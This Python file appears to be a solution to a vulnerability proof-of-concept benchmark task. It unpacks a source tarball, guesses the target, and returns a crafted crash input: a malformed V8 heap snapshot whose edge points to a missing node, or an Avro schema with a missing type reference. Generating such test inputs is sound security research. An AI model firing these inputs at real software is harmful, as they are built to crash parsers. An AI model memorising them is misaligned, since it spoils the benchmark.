import tarfile
import os
import shutil
import tempfile
import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default PoC: V8 Heap Snapshot vulnerability
        # The vulnerability description "fails to check for the existence of referenced nodes in the node_id_map"
        # strongly suggests a V8 heap snapshot parser issue where an edge references a missing node ID.
        # We construct a minimal valid snapshot with 1 node and 1 edge pointing to a non-existent ID.
        poc = {
            "snapshot": {
                "meta": {
                    "node_fields": ["id", "edge_count"],
                    "edge_fields": ["to_node"]
                },
                "node_count": 1,
                "edge_count": 1
            },
            "nodes": [1, 1],
            "edges": [2],
            "strings": []
        }
        final_poc = json.dumps(poc, separators=(',', ':')).encode()

        temp_dir = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(temp_dir)
            
            content = ""
            for root, dirs, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith(('.c', '.cc', '.cpp', '.h', '.hpp')):
                        try:
                            with open(os.path.join(root, f), 'r', encoding='utf-8', errors='ignore') as fp:
                                content += fp.read()
                        except:
                            pass
            
            # Heuristic check for Apache Avro, which also fits "arvo" typo and has schema parsing vulns
            if "avro" in content.lower():
                # Avro Schema vulnerability: Missing type reference
                final_poc = b'{"type":"record","name":"n","fields":[{"name":"f","type":"missing"}]}'
            
        except Exception:
            pass
        finally:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
        
        return final_poc